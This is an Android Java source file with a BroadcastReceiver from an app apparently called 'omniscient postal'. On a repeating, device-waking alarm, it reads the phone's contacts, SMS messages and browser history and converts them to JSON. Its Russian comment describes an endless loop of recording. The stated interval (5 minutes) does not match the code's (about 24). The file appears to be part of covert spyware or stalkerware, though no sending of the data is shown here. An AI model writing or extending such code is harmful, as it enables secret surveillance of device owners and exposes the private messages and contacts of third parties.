package com.postal.omniscient.postal.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.postal.omniscient.postal.browser.history.BrowserHistory;
import com.postal.omniscient.postal.reader.contact.ReadContacts;
import com.postal.omniscient.postal.reader.sms.ReadSms;

/** перезапускаем старт ресивера после выполнения (безконечный цыкл) раз в 5 мин записуем
 *  контакты ,смс и браузера историю*/
public class AlarmReceiver extends BroadcastReceiver {
    final int SDK_INT = Build.VERSION.SDK_INT;
    public AlarmReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.

//        Uri uri = Uri.parse(Environment.getExternalStorageDirectory().getAbsolutePath() + "/media/ringtone/sao.mp3");
//        Ringtone ringtone = RingtoneManager.getRingtone(context, uri);
//        ringtone.play();
//        Log.i("MyMsg", "VSE PROPALLLLLLLOOOOOO");
        ReadContacts contact = new ReadContacts(context);
        BrowserHistory browser = new BrowserHistory(context,context.getContentResolver());
        ReadSms sms = new ReadSms(context, context.getContentResolver());
        sms.smsToJson();
        contact.getContacts();
        browser.historyToJson();

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
        Intent myIntent = new Intent(context, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);

        if (SDK_INT < Build.VERSION_CODES.KITKAT) {
            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*24, pendingIntent);
        }
        else if (Build.VERSION_CODES.KITKAT <= SDK_INT  && SDK_INT < Build.VERSION_CODES.M) {
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*24, pendingIntent);
        }
        else if (SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*24, pendingIntent);
        }


    }
}
